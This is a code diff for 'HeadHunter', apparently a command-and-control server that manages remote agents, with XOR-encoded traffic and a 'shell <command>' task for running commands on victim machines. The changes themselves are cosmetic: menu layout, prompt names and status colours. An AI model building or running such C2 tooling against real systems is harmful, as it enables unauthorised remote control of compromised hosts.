@@ -45,11 +45,14 @@ int server_control_session(){
 
         if (strcmp(buffer, "help\n") == 0 || strcmp(buffer, "help\n\n") == 0) {
             printf("\nHeadHunter Control Server Commands:\n");
-            printf("> help                   |  List all available commands\n");
-            printf("> show sessions          |  List active connections\n");
-            printf("> use <session id>       |  Switch session to specified connection by id\n");
-	    printf("> kill <session id>      |  Task agent to die and close connection by id\n");
-            printf("> exit                   |  Close headhunter\n\n");
+
+	          printf("==========================================\n");
+            printf("help                     List all available commands\n");
+            printf("show sessions            List active connections\n");
+            printf("use <session id>         Switch session to specified connection by id\n");
+	          printf("kill <session id>        Task agent to die and close connection by id\n");
+            printf("exit                     Close headhunter\n\n");
+
         } else if (strcmp(newline_terminator(buffer), "show sessions\n") == 0 || strcmp(newline_terminator(buffer), "show connections\n") == 0 || strcmp(newline_terminator(buffer), "show\n") == 0 || strcmp(newline_terminator(buffer), "show \n") == 0) {
             printf("\nID          Address                  Status \n--------------------------------------------------------------\n");
             for (int i = 0; i < max_clients; i++){
@@ -77,7 +80,7 @@ int server_control_session(){
                 printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
 	    } 
 	    else {
-                printf("\e[1;32m[+]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
+                printf("\e[1;34m[*]\e[0m Entering agent control session with session ID: %d...\n", selected_id);
                 printf("Type \"bg\" to background agent control session\n");
 		
 		if(threads[selected_id-1] != 0){
@@ -106,7 +109,7 @@ int server_control_session(){
                 	printf("\e[1;31m[-]\e[0m No agent tied to ID\n\n");
             	} 
 		else{
-			printf("\e[1;32m[+]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
+			printf("\e[1;34m[*]\e[0m Killing agent control session with session ID: %d...\n", selected_id);
 			selected_id += 3;
 			for(int i = 0; i < max_clients; i++){
 				if(client_socket[i] == selected_id){
@@ -152,7 +155,7 @@ void *Socket_Reader(){
     char* response = "--HEADHUNTER NO--";
     char* xorresponse = XOR(response, key, strlen(response), keylen);
 
-    printf("beacon> ");
+    printf("hunter> ");
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
@@ -180,9 +183,13 @@ void *Socket_Reader(){
 
 		free(xorbuffer);
 		continue;
-	}
+	    }
 
-	if(a.kill == 0){printf("beacon> ");}
+	printf("\e[1;32m[+]\e[0m Received %li bytes\n", strlen(xorbuffer));
+
+	if(a.kill == 0){
+		printf("hunter> ");
+	}
 
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
@@ -231,18 +238,24 @@ void *Socket_Writer()
             return NULL;
         } 
 	else if(strcmp(newline_terminator(buffer), "\n") == 0){
-		printf("beacon> ");
+		printf("hunter> ");
 		fflush(NULL);
 	}
 	else if(strcmp(newline_terminator(buffer), "help\n") == 0){
-		printf("\n\t  Hunter Agent v1.0 Commands\n-------------------------------------------\nshell <command> - task the agent to run a command\nsleep <seconds> - task the agent to sleep for a specified time\nhelp            - displays this menu\nbg              - backgrounds the agent command session\nexit            - tasks the agent to exit\n\n");
+		printf("\nHunter Agent v1.0 Commands\n");
+		printf("================================\n");
+		printf("shell <command>    task the agent to run a command\n");
+		printf("sleep <seconds>    task the agent to sleep for a specified time\n");
+		printf("help               displays this menu\n");
+		printf("bg                 backgrounds the agent command session\n");
+		printf("exit               tasks the agent to exit\n\n");
 
-		printf("beacon> ");
+		printf("hunter> ");
 		fflush(NULL);
 	}
 	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
 	
-	    printf("\e[1;32m[+]\e[0m Tasking agent with exit\n");	
+	    printf("\e[1;34m[*]\e[0m Tasking agent with exit\n");	
 
 	    char* exit = "--HEADHUNTER EXIT--";
 	    char* xorexit = XOR(exit, key, strlen(exit), keylen);
@@ -271,13 +284,13 @@ void *Socket_Writer()
 
 	    if(str_starts_with(buffer, "shell") == 0 || str_starts_with(buffer, "sleep") == 0){ 	
 	    
-	    	printf("\n\e[1;32m[+]\e[0m Tasking agent with command\n");
+	    	printf("\n\e[1;34m[*]\e[0m Tasking agent with command\n");
 	   	a.beaconbufsize = n;
 	   	a.beaconbuf = buffer;
             }
 	    else{
 		printf("Invalid command, type \"help\" to list commands\n");
-		printf("beacon> ");
+		printf("hunter> ");
 		fflush(NULL);
 	    }
 	    //free(xorbuffer);
@@ -364,7 +377,7 @@ void *Acceptor(){
                 send(client_socket[i], xorresponse, strlen(response), 0);
 				*arg = client_socket[i];
 
-                        	printf("\nBeacon received from %s\n", get_socket_addr(new_socket));
+                        	printf("\n\e[1;32m[+]\e[0m Beacon received from %s\n", get_socket_addr(new_socket));
                         	printf("Press enter or type a command to resume previous session\n\n");
 			}
 
